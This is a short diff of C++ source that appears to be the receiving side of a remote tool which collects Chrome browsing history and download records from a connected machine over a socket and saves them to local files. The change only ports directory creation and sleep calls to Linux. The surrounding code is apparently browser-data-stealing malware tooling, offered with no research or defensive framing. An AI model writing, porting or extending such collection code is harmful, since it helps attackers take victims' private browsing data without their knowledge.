@@ -274,8 +274,14 @@ int main() {
 				send(conn, command.c_str(), sizeof(command), NULL);
 				recv(conn, buffer, sizeof(buffer), NULL);
 
-				if (!dirExists("chrome")) _wmkdir(L"chrome");
-
+				if (!dirExists("chrome")) {
+#ifndef __linux__
+					 _wmkdir(L"chrome");
+#else
+					 system("mkdir chrome");
+#endif
+				}
+				
 				if (strncmp(buffer, "none", 4)) {
 					std::ofstream history("chrome\\history.txt");
 					history << buffer;
@@ -286,8 +292,11 @@ int main() {
 					std::cout << "["; timenow(); std::cout << "]";
 					std::cout << " null history";
 				}
-				
+#ifndef __linux__
 				Sleep(1000);
+#else
+				sleep(1);
+#endif
 
 				memset(&buffer, 0x0, sizeof(buffer));
 				recv(conn, buffer, sizeof(buffer), NULL);
@@ -301,9 +310,11 @@ int main() {
 					std::cout << "["; timenow(); std::cout << "]";
 					std::cout << " null downloads";
 				}
-
+#ifndef __linux__
 				Sleep(1000);
-
+#else
+				sleep(1);
+#endif
 				memset(&buffer, 0x0, sizeof(buffer));
 				recv(conn, buffer, sizeof(buffer), NULL);
 				if (strncmp(buffer, "none", 4)) {
